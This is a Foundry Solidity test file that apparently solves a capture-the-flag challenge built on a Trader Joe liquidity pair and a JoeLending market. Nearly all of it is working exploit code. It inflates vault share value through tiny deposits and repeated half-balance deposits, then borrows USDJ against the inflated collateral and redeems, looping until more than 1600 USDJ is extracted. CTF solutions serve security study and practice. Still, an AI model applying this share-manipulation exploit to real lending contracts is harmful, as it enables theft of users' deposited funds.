pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Challenge} from "src/Challenge.sol";
import {BinHelper} from "@trader-joe/libraries/BinHelper.sol";
import {JoeLending} from "src/JoeLending.sol";
import {
    LBPair,
    PriceHelper,
    Uint256x256Math,
    Constants,
    SafeCast,
    PairParameterHelper,
    FeeHelper
} from "@trader-joe/LBPair.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {LiquidityConfigurations} from "@trader-joe/libraries/math/LiquidityConfigurations.sol";

contract Solve is Test {
    using Uint256x256Math for uint256;
    using SafeCast for uint256;
    using PairParameterHelper for bytes32;
    using FeeHelper for uint128;

    Challenge public chall;
    JoeLending public joeLending;
    LBPair public lbPair;
    ERC20 public usdc;
    ERC20 public usdt;
    ERC20 public usdj;

    address public currentUser;
    address public admin = makeAddr("admin");
    address public user = makeAddr("user1");
    address public user2 = makeAddr("challenger");

    function setUp() public {
        chall = new Challenge(address(user));

        // Get contract addresses
        joeLending = Challenge(chall).JOE_LENDING();
        lbPair = LBPair(address(Challenge(chall).PAIR_USDT_USDC()));
        usdc = Challenge(chall).USDC(); // YToken
        usdt = Challenge(chall).USDT(); // XToken
        usdj = Challenge(chall).USDJ();

        vm.label(address(usdc), "usdc");
        vm.label(address(usdt), "usdt");
        vm.label(address(usdj), "usdj");
        vm.label(address(lbPair), "lbPair");
        vm.label(address(joeLending), "joeLending");
        vm.label(address(user), "user");
        vm.label(address(user2), "user2");
    }

    function test_solve() public {
        userSelect(user);

        uint256 i = 0;
        while (true) {
            // 5 loops
            i++;
            usdc.transfer(address(lbPair), usdc.balanceOf(user));
            bytes32[] memory liquidityConfigs = new bytes32[](1);
            liquidityConfigs[0] = LiquidityConfigurations.encodeParams(1e18, 1e18, lbPair.getActiveId() - uint24(i));
            lbPair.mint(user, liquidityConfigs, user2);
            uint256[] memory ids = new uint256[](1);
            ids[0] = lbPair.getActiveId() - i;
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = lbPair.balanceOf(user, ids[0]);
            lbPair.approveForAll(address(joeLending), true);
            joeLending.deposit(ids, amounts);
            amounts[0] = joeLending.balanceOf(user, ids[0]) - 1;
            joeLending.burn(ids, amounts);
            amounts[0] = 2;
            joeLending.deposit(ids, amounts);

            while (true) {
                // 133 loops
                amounts[0] = (lbPair.balanceOf(address(joeLending), ids[0]) / 2) - 1;
                try joeLending.deposit(ids, amounts) {}
                catch (bytes memory) {
                    break;
                }
            }
            amounts[0] = lbPair.balanceOf(user, ids[0]);
            joeLending.deposit(ids, amounts);
            amounts[0] = 399.9999e18;
            joeLending.borrow(ids, amounts);
            amounts[0] = lbPair.balanceOf(address(joeLending), ids[0]) - 1;
            joeLending.redeem(ids, amounts);
            amounts[0] = lbPair.balanceOf(user, ids[0]);
            lbPair.burn(user, user, ids, amounts);

            if (usdj.balanceOf(user) > 1600e18) {
                break;
            }
        }

        console.logBool(chall.isSolved());
    }

    function printTokenBalances(address user, uint256 id, string memory title) public {
        console.log("--------------Balances--------------");
        console.log("**", title);
        console.log("id", id);
        console.log("usdc balance", usdc.balanceOf(user));
        console.log("usdt balance", usdt.balanceOf(user));
        console.log("usdj balance", usdj.balanceOf(user));
        console.log("lbPair balance", lbPair.balanceOf(user, id));
        console.log("joeLending balance", joeLending.balanceOf(user, id));
        console.log("------------------------------------");
    }

    function printLbPairInfo(uint256 id, string memory title) public {
        console.log("--------------LbPair Info--------------");
        console.log("**", title);
        console.log("id", id);
        console.log("isActiveID", lbPair.getActiveId() == uint24(id) ? "true" : "false");
        console.log("totalSupply", lbPair.totalSupply(id));
        (uint128 x, uint128 y) = lbPair.getBin(uint24(id));
        console.log("reserve-y", y);
        console.log("reserve-x", x);
        console.log("------------------------------------");
    }

    function userSelect(address user) public {
        vm.stopPrank();
        vm.startPrank(user);
        currentUser = user;
    }
}
